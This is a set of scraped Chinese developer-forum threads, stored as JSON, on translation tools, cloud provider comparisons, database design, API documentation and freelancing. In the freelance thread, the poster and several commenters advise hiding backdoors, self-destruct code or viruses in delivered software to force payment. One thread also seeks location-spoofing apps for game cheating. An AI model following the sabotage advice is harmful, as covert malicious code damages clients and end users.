第二次是改后的 url ，会影响体验…", " 点击以后跳转到内嵌 wap 网站，再记录里面的注册就不行了，因为用户可以选择离开打开分享页，如果记 cookie 也不准确，因为会一直保留，除非两边都记", "点击按钮，触发关键字图文回复，点击图文跳转到链接，然后统计关键字触发次数呢", " 所以我说用 replaceState 改", "加上小尾巴。", "URI 中加参数区分"]},
{"content": ["<div class=\"topic_content\">七牛存储的图片，为何不直接预览</div>"], "reply": "1", "tittle": "七牛图片，预览", "comment": ["省点流量吧。"]},
{"content": ["<div class=\"topic_content\">就是自己有本英文的书，想快速的翻译成中文的，各位大佬，有没有好的方法？</div>"], "reply": "16", "tittle": "有没有快速翻译整本书的工具（方法）", "comment": ["ps ：是电子书。", "有这种工具还要翻译干什么", "金山快译", "直接发包给翻译公司吧,这是目前最快的方式吧.\r", "如果不是十分着急,可以找在校老师学生,能便宜不少.\r", "如果是专业书籍的话,给谁都不会块的.", "耐心看吧，看完第一本英文书，第二本就不难了\r", "\r", "如果是其它的：\r", "1. 先用谷歌翻译粗翻\r", "2. 再审校，检查错误", "另外既然书都已经写好了,楼主也会中文.你再写一遍中文的不就好了,整理出来一个词表,找国内认识的大牛权威敲定一下对应翻译就行了.", " @", " 就是这些翻译不行，或者说一下子不能整本书都翻译，所以才有这样的想法。", " 书不是我写的啊。。   @", " 就是想知道有没有出现什么牛逼的工具。。。", "花钱找个会中文的老外读给你听。", "快 (包括延时和吞吐量) 质量 钱  这三者难以兼得", "译言网", "机器学习、形成自然语言理解能力。然后，重要应用之一就是这个。", "雇用上 100 个大学生，保证一星期搞定。", "目前的翻译工具达不到人类水平", "人工翻译也不行 行业发展极度滞后 英翻中千字 80 这对于译者付出的劳动简直就是侮辱性的定价", "最低成本的解决方法是学好英语自己看", "很简单啊，加钱就行，钱给够了翻译效率要多高有多高", "大家都是实话。。。所以学了翻译的孩子才没有去做翻译。。每次熬夜吐血赶稿，翻完眼睛都打圈啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>还没有买短信接口，所以只能自己去阿里云申请了一个，刚提交了模板审核，估计下午就能用上。</p>\n</div></div>"], "reply": "7", "tittle": "你司在开发和测试的时候需要发短信，你是怎么解决的？", "comment": ["找个短信提供商咯，阿里大于虽然稳定，但是也不便宜。\r", "可以买个 3 分、 4 分的小供应商先用着", " \r", "\r", "在阿里云买了，已经提交审核了，", "留后门，方便测试，正式发布改一下配置", "开发和测试的话自己写个工具模拟就好了", " 但是有时需要外部模拟，所以短信还是需要的。", " 阿里的必须要模板，不灵活，我用的都是你自己送字符串，送啥就是啥的。只要信息不敏感就行，敏感会被运营商拦截", " 确实需要短信提供商，估下目前不会买。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>公司最近在考虑上云，但是却陷入了选择困难症。</p>\n<p>情况是这样的：这几年国内云计算市场发展很快，出现了许多家提供公有云服务的厂商，但各家提供的服务大同小异。应该选哪家呢？这可难坏了我们的 CTO 大大。</p>\n<p><img alt=\"\" src=\"http://ww2.sinaimg.cn/large/006HJ39wgy1fekwtljxglj309y07hmzt.jpg\"></p>\n<p>老大本来想用阿里云，觉得阿里做的早应该在各方面都有优势，但是这几天发现这个想法似乎是错的。最近，国内专门做网络监测的机构博睿数据发布了一份报告，显示阿里云在网络质量这块落在了部分友商后面。</p>\n<h2>网络质量报告主要结论</h2>\n<p>博睿数据是业内专注做网络监测的公司，从 2015 年就开始监测国内云厂商的网络。今年 2-3 月用了半个多月的时间，对 9 家云厂商的 16 个机房主机进行持续监测，根据网络时延、丢包率、文件下载速度等核心指标进行综合排名。</p>\n<p>纳入评测范围的 9 家云主机厂商为：腾讯云、阿里云、百度云、华为云、美团云、盛大云、 UCloud 、青云、金山云，其中腾讯云和阿里云有位于北京、上海、广东三个机房的主机参与，其他厂商则为 1-2 台主机。</p>\n<p><img alt=\"\" src=\"http://ww3.sinaimg.cn/large/006HJ39wgy1fekwyexicyj30nt0idn1r.jpg\"></p>\n<p><strong>从综合排名来看，前三名为腾讯云北京、华为云北京、阿里云北京机房。</strong></p>\n<p>综合云厂商所有机房的情况来看，腾讯云机房网络质量算是最好的，因为他家参与测评的三个机房均进入了前五名，而阿里云的名次则是 2 、 8 和 9 名。</p>\n<p>看完这份报告之后，笔者又从各种渠道收集到了他家过去一年多来发布的排名数据，对这份报告进行辅助验证。下文分享笔者对历史数据进行分析，与部分友商对比后的一些发现。</p>\n<h2>历史排名数据分析</h2>\n<p>这次报告的数据，是否只是阿里云的偶然失利？从以往的数据来看，阿里云在网络质量上是否曾经独占鳌头？\n博睿此前一直在云平台网络质量的监测排名工作，提供了访问时延、丢包率、下载速率等数据。大概每隔 1-2 个月就会发布一次排名，目前笔者拿到的是 2015 年 6 月到 2016 年 9 月这段时间的公开数据。</p>\n<p><img alt=\"\" src=\"http://ww2.sinaimg.cn/large/006HJ39wgy1fekwubdvj8j30m409lq3e.jpg\"></p>\n<p>这些数据发布在其官网和微信公众号，均以图片形式分享，笔者对其中的详细数据进行了 OCR 提取和手动修正。中间有某一期有数据缺失，笔者采用了该期前的均值替代。最后，根据博睿的排名数据，得到了下面这张趋势图：</p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/006HJ39wgy1fekx0dczgjj30xc0m8di3.jpg\"></p>\n<p>从上图来看，<strong>腾讯云的三个机房得分均长期领先于阿里云</strong>，其中腾讯云-广东机房的综合得分长期保持在 90 分以上，部分甚至高达 99 ，也是多次斩获了第一的名次。</p>\n<p>阿里云-北京、阿里云-深圳的初期得分均较低，有一段时间还挣扎在及格线上；阿里云-上海机房从 2016 年 5 月纳入测评范围，但是当时已经属于阿里云三个机房中得分最低的了。不过好在阿里云机房在逐步改善网络质量，得分慢慢上升。</p>\n<h2>结语</h2>\n<p>阿里云一直在给市场灌输自己行业第一的认知，但是事实是否真的如此？</p>\n<p>从上文提到的报告和历史监测数据来看，阿里云在部分领域还是处于落后位置的，比如说在基础网络质量上就不如友商腾讯云。而后者的优势，一定程度上应该是得益于腾讯自身 QQ 、微信等业务的要求而取得的网络实力积累，才能够提供更高质量的基础网络服务。</p>\n<p>最后，建议各位 CTO 在上云之前，多做些实际的测试和比较，拿数据说话，这样才能够做出明智的决定。</p>\n</div></div>"], "reply": "16", "tittle": "145 个节点数据监测， BAT 云服务哪家强？", "comment": ["我之前也做过两次类似的数据测试，结果和上面类似。阿里云并没有优势，和他们市场推广的完全匹配不上啊。。。。\r", "\r", "20 天持续压测，告诉你云存储性能哪家强： ", "\r", "国内公有云大幅降价后，首份一手云计算产品评测报告： ", "测试数据能不能公开一下？", "是的", "总感觉腾讯云，稳稳的。", "抛开这些因素，客服态度和响应速度也是重要的考虑因素...这样的话，某里云是不是更低了……", "腾讯云北京在他们天津机房，是亚洲最大也是最好的那批机房", "这个评分没什么意义, 差距都在 千分之几左右. 这个三家选哪一个都不会太差. 如果只卖几台,就看那个服务方便,满足你的要求, 如果是大量采购,就看价格,商业合作关系, 专门销售代表,技术支持是否到位.", "用腾讯云两年了，非常稳定。而且 CDN 和 COS 的免费额度也很多，中小项目够用了。", "一般用腾讯云做小游戏服务器和网站的（主要是阿里云好贵..........）", "如果让我选的话 我选择阿里云和腾讯云\r", "对 XX 和 YY", "这种“评分”毫无意义", "公司用阿里云。我个人用腾讯云，感觉客服很好，价格也便宜点。", "先别说网络，腾讯云的 io 就可以秒杀阿里云", "这评分具体项目和数据是什么都没公开吗...那参考价值就太低了...", " \r", " \r", "\r", "我是在这里看到的评测报告：\r", "\r", "阿里云的运营团队和营销团队水平比腾讯云高的不知道哪里去了，\r", "腾讯的服务器比阿里云强的事情众人皆知，但是没有阿里云会吹牛逼会装逼  没辙"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天去面试了一下美团，解决了自己长久一来的一个问题，也发现了自己在思考问题方面的一些缺陷，写出来主要目的是缓解一些有我这样子类似焦虑的同学。</p>\n<p>自己长久的问题：如何成为一个合格的程序员？我一直以来对这个东西的答案是不断地学习，看各种底层的实现，理解其基本原理，这样子，当自己工程有需要的时候就会有曾经看过的知识影响自己，举个简单的例子，对于 hash 的应用和文件的修改个可以作为判断是不是需要状态更新的条件。但是我个人在重复上面的过程中却发现伴随自己看的东西越多，就越焦虑，一方面看的东西很多，实践遇到问题会花费不少时间，自己却未必能做出来类似成品的效果；另一方便，看的东西很多，就比较容易忘，又不能保证每天都有足够的时间复习。今天下午的面试给我的答案是：程序员重点是指对于新东西能够迅速掌握要点，然后上手进行相应的工作，所谓的看了很多，如果效果还不如别人的那么就算了，不如只是把自己手头在做的仔细研究下，这样子自己的焦虑也会减少。</p>\n<p>思考问题方面这点我也存在一部分疑惑，当回答问题时，如果对某一个部分不清楚，无法确定对错时，我宁愿说不知道而不去说出自己已经想到的部分正确答案，在我看来如果无法保证正确性就应该闭嘴，但这次面试的经验告诉我如果自己有部分想法最好直接说出来，因为很多时候面试官看的是思考过程，一个完整的过程并不好想，一部分有意义的答案很可能会对后来的思考起到帮助。实际上当一点答案都不说出来的时候，内心的紧张感就会极大的干扰自己的正常状态。不过说起来面试都快十次了，还是紧张能干扰到整个想法，只能说明自己还是不够冷静。</p>\n<p>最后一点小小的感受：面试前避免长时间运动，吃饱饭，睡好觉。</p>\n</div></div>"], "reply": "8", "tittle": "记录一次有意义的面试带来的经验", "comment": ["第一条有同样的体会，第二条也同感，有时候对某一个事情没把握的时候我选择的回答是不知道，因为我怕误导别人。", " 实际上我发现在我这一届，第一条的焦虑感我身边只有很少的人有。。。可能确实是太焦虑，偏离了正途？", "第一点，多记笔记、写博客。没有谁有那么好的记忆力，自己学到的感受到的写下来才看得见积累。\r", "快速熟悉、接手业务不仅仅是技术水平，也考量人的情商和交流\r", "\r", "第二点，程序员普遍比较的务实才会出现你说的情况，但是不清楚不说面试的时候是比较吃亏。", "一次面试改三观么？下次换个地方面试搞不好你又回到之前的观点了。", "第一条有过同样焦虑，不过有没有可能是因为看过很多，所以学新的也更快？看过很多有时候具体细节容易忘掉，但是看懂了后的一些理论、原理倒是不容易忘掉，如果看到的东西能跟之前的知识能找到一些关联性，自己能够总结归纳的话，更难忘掉。\r", "第二条感觉跟性格有点关系，确实像 LZ 说的一样，无法保证正确性的情况下也得跟面试官沟通自己的想法思路，否则面试官可能认为你根本没去思考……", "我觉得多学习是有用的，虽然会因为没有复习导致遗忘部分内容，但会在以后需要的时候有个大致印象。\r", "\r", "也能在以后遇到与之相关问题的时候，能以以前哪些知识为基础进行思考解决问题。", "最近一直是这个感觉，边学边忘，然后才发现单单学是没用的，要梳理要输出，形成知识体系，落单的知识点很容易忘记。", " 哈哈，有可能，这次之所以感触比较深，是因为原先是发现自己哪一块儿忘了，复习下。这次是发现那一块儿忘了，本身一直有一部分疑惑。哈哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近项目组人手紧张，被单独分到一个新的电商项目（卖手机的），组长让我尝试一下表的设计（无奈见识少~很多东西捋不清楚）</p>\n<h1>如果我的手机的商品详情页要展示的有：</h1>\n<h1>xxx 手机          价格（不同属性组合不同的价格）</h1>\n<h1>颜色：黑色、白色、红色</h1>\n<h1>内存： 32G 、 64G 、 128G 、 256G</h1>\n<h1>套餐方式：套餐一、套餐二、套餐三</h1>\n<h1>购机方式：裸机、合约机</h1>\n<p>最初的想法是：建两张表： 1 、 tb_product 存储一些固定属性（手机类别+规格参数+描述等等....)2 、 tb_product_expand 存储一些扩展属性（颜色+内存+套餐方式+购机方式：黑色+32G+套餐一+裸机+图片+价格+库存） 如果这样设计的话，以上面给出的例子来说，我就有 3x4x3x2 = 72 种组合方式（可能会更多），这只是一种型号手机的组合，如果把全部手机类型考虑进去， tb_product_expand 会很膨胀，对于开发跟后期运营感觉都很不友好。</p>\n<p>有没有大大指导一下我应该怎么来设计对后期的扩展跟维护比较好？或者说我这样的思路是错的？唉，项目组的高工都被抽调走了，实在没人问呀~~~</p>\n</div></div>"], "reply": "8", "tittle": "[请教] 大大们~如果是你们，怎么来设计这种商品表？", "comment": ["google 一下 sku 设计，应该能找到答案。", "spu   sku   sku 属性  这样的", "觉得可以做成定制笔记本的那种计算方式\r", "先定一个基数价格\r", "最终价格就是基数加上各个选项的费用\r", "数据库存放基数价格和各个选项价格\r", "总价就是把在集合内的选项价格 sum", "SKU SPU 电商的一般做法了，谷歌一下就知道了", "属性表 ID 名称 值\r", "1 白色 1\r", "2 黑色 2\r", "3 16G 4\r", "4 32G 8\r", "5 内存 16\r", "6 颜色 32\r", "手机库存表 ID 分类 XX 手机 固定属性 基础价格 等固定参数 ... \r", "1 20 小米手机 固定属性  999.00\r", "参数对应价格表 ID 分类 参数名 参数值 价格增加 库存\r", "1 20 16 8 200.00 -1 （如果可替换表示无限）\r", "2 20 32 2 50.00 300 （ 300 台黑色的）\r", "3 20 32 1 100.00 700 （ 700 台白色的）\r", "4 21 16 4 150.00 （其他手机）\r", "没有设计过数据表，如果是我的话大概会写成这样。详情页里如果某个配置卖完了则会变成不可选。计算通过不同配置的价格加基础价格实现，不过好像会查询很多次表的样子。", "祭出当初我看过的两篇。 不知道楼主有没有 G 过看过这两篇\r", "\r", "\r", " \r", " \r", " \r", " \r", "  谢谢大家 我参考一下。", " 刚刚看了 有收获 谢谢"]},
{"content": ["<div class=\"topic_content\">最近失业，迷茫中，求各们大大带入门</div>"], "reply": "26", "tittle": "有搞机器学习的大大吗？求带入门", "comment": ["读研去\r", "门槛还是有一点的，不然入了行还是最底层。\r", "\r", "要稍微深入一些，光各种数学就够你学一两年", "我想入门区块链 有大大能指一条入门明路吗", "我家一直特别乱 有打扫卫生的大大带一下吗 求带入门", "我想入门量化投资，有大触能带一脚吗", "我想入门找女朋友，有大大带一下吗。", "唉 都会发帖了 \r", "就不会试着找找资料视频什么的 先看看这玩意大概大纲和所需知识吗\r", "溺水者吗....... 看不到身边的漂浮物.......", "先自爆一下数学水平如何？概率论学的怎么样就可以", "可以报个 Udacity 的机器学习课", "玩过 tensorflow 还是可以的", "一听到流行就要去学，先问问自己是不是真喜欢学。", "大家都那么忙。", "想学学数学了，有什么好网站么", "先看斯坦福 ml 公开课吧，让最牛的大大带你", "coursera,udacity", "数学常年挂科，英语也没及格过，请问我有希望能学到点皮毛吗", "  如果英文看不懂的话........个人认为那你还是选择转行吧...........（跑）", " 哈哈哈哈哈哈哈", " 就不", " 哈哈，好！", " 旁边刚好有爱好户外的女生 感兴趣吗？", " 这个主意好 这位 V 友在搞这方面吗？可以一起学习讨论吗？", " 唉 读研是不想了 还是根据别的 V 友建议，先看点公开课，有兴趣一起学习讨论吗？", " 可以来我家 一起打扫，包带你入门", " 怕啥，想学就学", " 这在哪里报啊？这位 V 友了解情况吗？", " "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比较喜欢小巧的那种，拿着方便，放包里也不太占未知，想买个 Mac Pro ，可惜了，太贵，</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "该死的键盘有掉了一个，请推荐机械键盘", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前不久,朋友介绍一个项目,由于时间太急,两天要出结果, 做一个系统.\n说好 5K, 我收了 1K 的订金.\n好,\n我开始加班, 两天搞完,每天熬到 3 点.</p>\n<p>后来, 把代码发给对方了, 还教对方怎么安装, 怎么装数据库....</p>\n<p>后来, 这家伙跑路了...</p>\n<p>我想了想, 我都遇到这样的事两回了, 没有长记性.</p>\n<p>以后</p>\n<blockquote>\n<p>大单, 签合同, 收 30%订金</p>\n</blockquote>\n<blockquote>\n<p>小单, 收 50%订金, 必放后门, 跑路者, 自毁, 或下病毒, 后果自负.</p>\n</blockquote>\n</div></div>"], "reply": "68", "tittle": "吐槽一下接活 - 被跑路了", "comment": ["应该引入 upwork 的里程碑机制", "近期同被鸽子的路过", "钱都给完才给代码，反正押金都付了，爱做不做。", "演示的时候必须是在自己的机器上，功能验证完成，才能给源码，即便源码给了，也得有个简单的加密及注册码验证功能。", "朋友介绍，那找朋友啊", " \r", " \r", " \r", " \r", "主要是当时只有两天的时间, 对方也很急, 所以没有想太多, 程序色犭袁还是太善良, 不会套路", " 朋友也在帮追讨, 不能怪朋友.", "最后尾款跑路了。:(", "不曝光？", "云沃客就有里程碑功能,按进度结算或者按照功能点结算.算中国的 upwork 不.而且项目款是平台托管.不会出现不付钱跑路或者少付钱的问题.推荐做私活的同学.www.clouderwork.com", "额，一直是全款后开始干活啊。", "1 收取定金\r", "2 代码永远都在自己服务器, 然后提供接口 给对方即可.. 即便是类似安卓客户端这种代码, 数据计算也全都放到服务器上, 随时都可以远程开关", " 好奇楼主的头像怎么生成的？同想搞一个", "刚吃完亏+1 好一点的是也是朋友介绍的 钱追回来了 \r", "一直拖着尾款不给\r", "已经准备好了直接关代码，放水军，喷死他", "问题就出在朋友介绍上。生意是生意，朋友是朋友。水火不容。", "一般都是 541 啊. 虽然尾款基本要不回来. 但起码要给了 5 和 4 才能交代码啊.", "接私活不太方便，我想做接私活，怕做完了给对方就跑了，该怎么办？", "做之前要谈好，吃过亏", "未付款前给加密代码或者不直接给代码，做完再给。", "楼主不会给你自己的代码留后门吗。。。？", "楼主今天可以写篇论文了，论加盐的重要性。。。（逃", "5K 就跑路，还不懂代码。真搞不清楚这个人。\r", "万一代码出现了什么问题。不是还需要帮忙吗？足以见得这个人的人品极差、鼠目寸光。", "我们最近外包个单子，， 4W ，都是按 5 成的首付给的。。", " 接外包，开票是怎么处理的？", "接私活的渠道是什么，发票收据什么的怎么搞的？", "没事的，你要相信自己写的程序肯定会有 bug ，到时候看他找不找你修复 bug 吧。", "之前公司有专门的部门做外包，老板重来不担心收不到钱，我想也是，那么多的漏洞 bug ，敢不给钱？删除数据库", "想起以前还没毕业时候，为了练手和赚零花钱接了个 5k 的项目，订金都没收，全程依靠 qq ，结果做完把结果发给别人然后 qq 就被拉黑了", " \r", "想多了，这种出了问题自然找别人，大不了都不用相同的路数再来一次，还是要在收费手段上想办法，这种小项目留后门没太大用处", "还好我写的代码 bug 多啊(逃", " 「还好我写的代码 bug 多啊(逃」\r", "对方跑也跑不远是么^_^", "我干了一个半月的外包（后端朋友分给我的），每天 12 点睡觉，周末每天十小时以上。\r", "现在人家都在测 web 了，我也问了三四次什么时候给第一部分的款，总和我说放心，钱不会少的。\r", "问题是就 10K 要做 web 端和两个 hybird app ，我不清楚这项目到我这转了几手了，也不清楚后端他是怎么分的这个钱\r", "所有的就是 QQ 交流，这个礼拜还不给钱，我也跑路了", "我现在接单也都是按 50%收定金", "要卖服务千万不要卖代码. \r", "婊子都知道卖服务不卖器官.", "不应该给代码。还有什么项目 5k 就给做了？", "最近在做朋友接的活 友情价 都没挣头", "不管是谁，干活前先收 3 成款，干完活对方就得 ok 后再收 4 层款，最后确定没问题后再收 3 成款。收完全款后才给源码。\r", "款没完全收完前，得留后门。", "看来首款得收 5 成呀。", " 心可真大。", "现在买房第二套都是 6 成首付了，看了接私单也得 6 成了，哈哈", "最怕的就是那种脑子一热要做项目的，做到后面甲方脑子清醒下来，不要了，然而你却只拿个 30 的定金还在做的欲仙欲死，做完找人交货的时候，人都找不到", "接单子公司事情多，没怎么做的路过。", " 哎，下次再找我做什么什么，没先款不干了，不贪这种钱，拖死人", "叫你不 30%  50%  20%  这样收钱  就当教训吧~", "慢慢被跑习惯了就掌握技巧了 干活前先收一定量(看钱和活) 干完给对方演示(不给源码)  这时候要给足 80%以上  然后给对方源码 确认没问题再给尾款  如果这时候对方以不在当初约定的基础上加东西也不加钱 你也可以跑路了。", "哈哈，我以前做过一家公司的官网，还没做完公司倒闭了。", "343 是对双方比较合适的方式", " 你怕不怕", "留个后门啊!", "哎   我接活怎么都接不到", "- 尾款不到位不给代码\r", "- 大项目或代码库由对方管理的，按小时计费，每周结帐。", "我外包过项目，预付了款，对方做得不到位，工期一拖再拖，我直接什么不要了，时间才是成本", "也遇到过类似情况，最大问题还是角色定义问题，后来主要决定接下的项目一律按工作室或者公司的方式去进行这个项目。", " 好有画面感，抱歉我不厚道的笑了，想起自己刚毕业被黑中介骗押金来了。。。", "给需求-议价-定金-开工-做完截图录制演示视频等材料-交尾款-交代码-收尾", "没被跑路过，大概是因为感觉不靠谱的都拒掉了……", " +1.  朋友介绍，找朋友啊", "还是放众包靠谱些，对双方都好", "一手交钱一手交贷啊\r", "可以不要定金，所有测试全在自己服务器，要部署，请全额谢谢。", "你这朋友办事不靠谱，一般介绍的不都直接谈完需求了直接全款转账过来才开始做吗", " 请问一下 4 是什么阶段", " #60 \r", "5 是订金阶段 确定需求 签合同 \r", "4 是开发完成阶段 代码开发完成通过线上环境演示 客户确认后付款 协助部署\r", "1 是尾款 客户运行一个月验收确认 修改剩余的 bug 和少量修改细节", "作者：翡翠\r", "链接： ", "\r", "来源：知乎\r", "著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\r", "\r", "付款的方式大致分为四种： 1. 交源代码付款能够放心的做到交源代码付款的项目不多，一般都是和学生有关的，编程作业和毕业设计（脚本语言除外）。因为对于学生来说，只有拿到源代码才算是完成，二进制文件一点用都没有。你把程序写完编译完，发给客户测试，客户测试之后觉得没有问题了，付你尾款，你再把源码给他。客户也不会担心付了款你不给源码怎么办，因为你程序写完了源码留着一点用都没有。 2. 在线演示付款适合 Web 程序，只要不是纯前端的就行。你在开发的过程中就可以在公网上部署一套程序，测试和演示都很方便，客户也很放心。客户对程序验收完成之后，付尾款，你再交付程序或者替他部署。 3. 交 demo 版付款适合不需要源码的桌面程序。有很多做 XX 管理系统用在自己的店里 / 厂里的人，其实不需要源代码，和他们谈的时候也不要把源代码作为付尾款的条件。这种情况下只需要约定一个 demo 版的限制就可以了，最好不要用时间期限，因为客户在单机上用可能会改系统时间。如果是网络版的，可以联网获取时间验证。比较常见的方法是，数据库条数（最多 50 个客户，最多 200 记录），适合管理系统；频次限制（最多连续运行五分钟，最快每秒钟一次），适合自动操作软件。在结果中混入随机字符串，适合生成文本的软件。根据具体任务需求可以自己想限制，只要对方相信这个功能你实现起来没有难度就可以。 4. 录屏演示或者远程桌面付款这是最麻烦的一种，常见的类型有，脚本语言，临时任务。具体的做法就是用录屏软件录一段软件操作视频发给客户。如果他不愿意的话，可以用 Teamviewer 或者 QQ 远程桌面，让客户自己测试。有的客户可能接受不了，一定要在做之前约定好，如果不愿意就不要做。脚本语言这类很好理解，比如 Python 或者纯前端的任务，源代码一旦交出去你就没有任何筹码了。临时任务就要靠警惕性了，比如客户要处理一批数据，抓一批网站。有的客户在找你的时候可能说的很多，例如有一千万条数据要处理，但是其实只有一万条数据。你把 demo 版交付给他，他拿着 demo 就把事儿办完了，然后就再也不见了。", "朋友都这样？？？", "从删库到跑路没学好", "长记性了吧，其实很好分辨的，通过正规的第三方平台去做，即使少收一点钱也有保障好过收不到钱", " 嗯,说的挺对的,低门槛的众包平台可以去云沃客,资金托管跟里程碑交付都支持.https://www.clouderwork.com  不怕对方跑路~", "云沃客我去过，在上面接过活，还可以 ", " 不谢", " 多谢，以后可能要用到~"]},
{"content": ["<div class=\"topic_content\">阴阳师最近修改了定位规则，原来模拟 GPS 信息就行了，现在特别麻烦，通过基站和 WiFi 定位了。\r<br>360 极客版是通过这种方式模拟定位的，但是他只支持部分预定义的位置，所以问问有没有其他的同类型应用</div>", "<div class=\"topic_content\">FakeLocation</div>"], "reply": "3", "tittle": "安卓有没有通过修改 WiFi 热点和基站信息伪装位置的应用", "comment": ["通过 xposed 模块，什么都可以伪装", "xPrivacy", " \r", " 我找到了，谢谢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>遇到一个尴尬的问题，我司 API 文档都是使用 markdown 来写的，然而是放在项目目录下面的 <a href=\"http://README.md\" rel=\"nofollow\">README.md</a> 中，但是多人人多的时候修改起来就比较麻烦，就想用有没有一种在线的 API 文档管理程序撒的，石墨固然好，好像不支持 Markdown 所以没打算用。</p>\n<blockquote>\n<p>哎。 Fuck</p>\n</blockquote>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>看了各位的评论，表示API文档还是可以独立部署代表比较好，我可不想把自己程序的API说明丢在别人家。</p>\n<p>其次，看了下<code>swagger</code>，感觉UI挺不错，抽时间研究下。</p>\n<p>我司下载就是放在仓库下面的README.md中。</p>\n</div></div>"], "reply": "97", "tittle": "话说你司的 API 文档是如何进行管理的？", "comment": ["我们用的 mediawiki 搭建的 api 接口词条", "既然是 md 写的，推荐个系统 docsify 很方便，样式默认 vue 也可以改其他", " 可以在线修改吗？我想着尽可能就放内网，", " 这个确实很不错，可以考虑。", "wiki 不谢", "  我司用 word 。。真的要哭出声来", " 心疼你三秒。", " 贵了点，哈哈。", "confluence", "swagger", "\r", "可内网部署", "Google 是和源码目录放在一起的 md 文件，同样加入版本管理，代码审查。然后再搭配一个搜索。", "swagger +1", "有 doc 和 wiki", "swagger +1", "confluence 。不过没用 markdown ，而且改版的时候更新也不是很及时。。", " 表示打不开，就是需要内网部署的。", " 没 markdown 真的很痛苦", " \r", " \r", " \r", "考虑下午玩玩看。", "口耳相传", "apidoc", " 这个吊", "最开始是写在 wiki 里，认认真真，完完整整，慢慢地就不维护了，有人要接口文档的话就用 postman 请求一次，截图发给谁。。。", " 我也在用 postman ，因为老大没买这个东，所以还不能做到团队公用，", "wiki, 不会调格式", "小幺鸡在线文档。不过不是用 markdown 写的", "有部分文档但基本上不是最新的，最新的也是靠口耳相传", "没有文档。自己翻代码", "口口相传", "apidoc + 1", "swagger +1", "更正： ShowDoc", "难道没有用 tower 的?", "showdoc + apidoc\r", "showdoc 是前人用的， coding+编辑维护不是方便，后来用 apidoc ，注释直接写在 code 里，然后命令生成，虽然注释在编写时也不是太方便，但感觉对 coding 和维护好一点儿", "gitbook", " View 里面加注释确实会给后人一个更方便理解，但我司的风格不适合", " 我司就用，哈哈。", "swagger+1", "我司用 word 。。快被气死", "swagger", " #25 是这样的", "我司 API 文档靠口口相传", "swagger +1\r", "apidoc +1", "口口相传\r", "\r", "心有灵犀", "口口相传 \r", "\r", "心有灵犀\r", "\r", "(●'◡'●)ﾉ♥", "用 mkdocs+git", "swagger+1", "喊！呀", " 上班着，要被你的答案笑死了，虽然我们也是口口相传", "看来不止我们用 word /(ㄒoㄒ)/~~", "Word Wiki 有道云 + 口口相传", "RAP", "  @", " @", "    txt 的默默路过  =。=", "口口相传牛逼", "想起了前前前公司，我刚工作的时候\r", "\r", "CTO 特别屌\r", "\r", "自己撸了一套 API 网站\r", "\r", "还以为是 IT 公司标配\r", "\r", "后来几个公司 tmd 全是 word", "写 WORD 里扔 SVN 上。 T_T", "遇到过 word 生成 html 扔内网服务器，给个固定网址的……", "文档是写在代码里，然后有专门处理程序会把代码的文档提取出来，生成 api 文档，同时生成测试工具:)", " #22 还不错了，我们是代码讲那过去的故事……", "用 Swagger 或者 RAML 写 YAML 规范，自动产生文档和代码。", "apiary", "更正： apiary", "GitLab ，和代码分开，做一个单独的 doc 库，用 markdown 写，管理方便", " 听过口耳相传，实在想不出贵司的口口相传是怎样的风景。", "swagger  :)", "我司 google doc", "dokuwiki", "就一条 curl 命令", "竟然没有 sphinx ，专业文档编写 100 年", "前公司是把 git 目录 mount 到一个 MkDocs 的 container 里……", "没人推荐小幺鸡么？", "html - chm", "个人觉得 API 文档维护的最大问题是忘记维护，或者有时候赶时间就懒得维护，所以个人倾向于将 API 文档与代码放在一起。\r", "我们是 JS 全栈， JS 有一套 JSDoc 标准，适用于非 API 场景的文档编写，依照这个标准，有一个 APIDoc 工具，可以用类似 JSDoc 的方式在代码中用注释编写 API 文档，但是在实际应用过程中感觉不适合我们的应用场景，所以自己写了一个 URIDoc ", "\r", "目前还是 v1 的初级阶段，欢迎 Fork 和 PullRequest", "\r", "showDoc", "口口相传 +1", "word + 1", " 我前公司就是这样的。", "腾讯微信的公众号开发文档就是 word ，最开始的时候，里面引号还是中文的。", "推荐一个东西， ", "自己看代码", "QQ 聊天记录", "写 markdown 扔在 gitlab 上", "额，公司的 boss 系统有 API 文档检索功能，虽然界面粗糙，不过挺实用", "我司自己开发的接口管理系统： ", "写 word 扔 svn ，己准备离职！", "之前 swagger  ，现在 RAP", " 活捉大神一枚。", "在用 [aglio]( ", ") ，不过数据多了后会有一点点慢。", "sphinx 为啥没人提起呢.", " 难怪看的眼熟。。。。", "必须小幺鸡啊……团队已从 RAP 切换到小幺鸡了", " 你赢了", "为什么不用 oschina 啊..", "apidoc"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>随着智能手机的全面普及和市场泛娱乐化，移动游戏行业发展迅猛，无论是市场收入还是用户规模，手游在游戏市场上已经占据了半壁江山。如此火热的市场吸引了大量外挂、辅助工作室等非法盈利团队，严重影响了游戏的收益、平衡，缩短游戏的生命周期，那么外挂对手游会形成哪些危害？又如何避免这些损害？</p>\n<p><a href=\"https://www.qcloud.com/community/article/562370?fromSource=gwzcw.93021.93021.93021\" rel=\"nofollow\">阻击外挂——《龙之谷手游》安全测试的那点事</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "阻击外挂——《龙之谷手游》安全测试的那点事", "comment": []},
